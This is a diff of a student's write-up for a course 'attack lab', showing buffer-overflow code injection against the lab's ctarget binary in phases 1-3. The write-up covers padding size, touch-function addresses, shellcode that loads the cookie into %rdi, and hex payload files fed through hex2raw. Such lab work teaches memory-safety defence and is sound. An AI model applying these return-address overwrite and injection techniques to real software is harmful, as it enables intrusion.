@@ -42,14 +42,14 @@ We can see that `0x18` (hex) or `24` (decimal) bytes of buffer is allocated to `
 
 Now, since we know the buffer size we can try passing the address of the touch1 function.
 
-```
+```bash
 jxxxan@jupyter-xxxxxx8:~/lab3-attacklab-xxxxxxxxuhan/target66$ cat dis.txt | grep touch1
 000000000040261e <touch1>:
 ```
 
 We were told in our recitation that our system was little-endian (so the bytes will be in the reverse order). Otherwise, we can use python to check:
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ python -c 'import sys; print(sys.byteorder)'
 little
 ```
@@ -63,7 +63,7 @@ We have our padding size and the function we need to call, we can write it in `c
 1e 26 40 00 00 00 00 00
 ```
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw < ctarget.l1.txt | ./ctarget 
 Cookie: 0x3e8dee8f
 Type string:Touch1!: You called touch1()
@@ -100,14 +100,14 @@ however, you must make it appear to touch2 as if you have passed your cookie as 
 
 This hint tells us that we need to store the cookie in the rdi register
 
-```
+```asm
 movq $0x3e8dee8f,%rdi 
 retq
 ```
 
 To get the byte representation, we need to compile the code and then disassemble it.
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase2.s && objdump -d phase2.o
 phase2.s: Assembler messages:
 phase2.s: Warning: end of file not at end of a line; newline inserted
@@ -140,7 +140,7 @@ We need to find the address of `%rsp` after calling `<Gets>` and sending a reall
 
 What we are going to do now is to add a break on `getbuf`, and run the program just after it asks us to enter a string and then find the address of `%rsp`
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gdb ./ctarget
 GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
 Copyright (C) 2022 Free Software Foundation, Inc.
@@ -197,7 +197,7 @@ address of touch2 function
 
 To get the address of `touch2` we can run:
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch2
 000000000040264e <touch2>:
   402666:       74 2a                   je     402692 <touch2+0x44>
@@ -214,7 +214,7 @@ jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep to
 
 Do note that our required padding is 24 bytes, we are only adding 16 bytes because our asm code is 8 bytes on its own. Our goal is to have a total of 24 bytes in padding, not 8 + 24 bytes, 
 
-```
+```bash
 joxxxx@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw < ctarget.l2.txt | ./ctarget 
 Cookie: 0x3e8dee8f
 Type string:Touch2!: You called touch2(0x3e8dee8f)
@@ -238,7 +238,12 @@ where you place the string representation of your cookie.
 
 Because `hexmatch` and `strncmp` might overwrite the buffer allocated for `getbuf` we will try to store the data after the function `touch3` itself.
 
+The rationale is simple: by the time our payload is executed, we will be setting `%rdi` to point to the cookie. Placing the cookie after `touch3` function ensures that it will not be overwritten by the function calls. It also means that we can calculate the address of the cookie with relative ease, based on the known offsets.
+
 => The total bytes before the cookie = Buffer (0x18 in our case) + Return Address of %rsp (8 bytes) + Touch 3 (8 Bytes) = 0x18 + 8 + 8 = 28 (hex)
+
+* Return Address (8 Bytes): Since in a 64 bit system the return address is always 8 bytes, by overwriting this address, we redirect the function to jump to our desired location upon returning (e.g. the beginning of the `touch3` function)
+* Touch 3 (8 bytes): The address of the `touch3` function is 8 bytes long.
 
 We can use our address for `%rsp` from phase 2, and simply add `0x28` to it.
 
@@ -251,7 +256,7 @@ movq $0x55621B68, %rdi
 retq
 ```
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ gcc -c phase3.s && objdump -d phase3.o
 phase3.s: Assembler messages:
 phase3.s: Warning: end of file not at end of a line; newline inserted
@@ -278,7 +283,7 @@ cookie string
 
 To quickly get the address for `touch3`
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep touch3
 0000000000402763 <touch3>:
   402781:       74 2d                   je     4027b0 <touch3+0x4d>
@@ -287,7 +292,7 @@ jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ cat dis.txt | grep to
 
 We need to use an ASCII to Hex converter to convert the cookie string into hex.
 
-```
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ echo -n 3e8dee8f | xxd -p
 3365386465653866
 ```
@@ -303,7 +308,8 @@ Thus, our cookie string representation is `33 65 38 64 65 65 38 66`
 33 65 38 64 65 65 38 66
 ```
 
-```
+
+```bash
 jxxxxn@jupyter-naxxxx88:~/lab3-attacklab-naxxxan/target66$ ./hex2raw < ctarget.l3.txt | ./ctarget 
 Cookie: 0x3e8dee8f
 Type string:Touch3!: You called touch3("3e8dee8f")
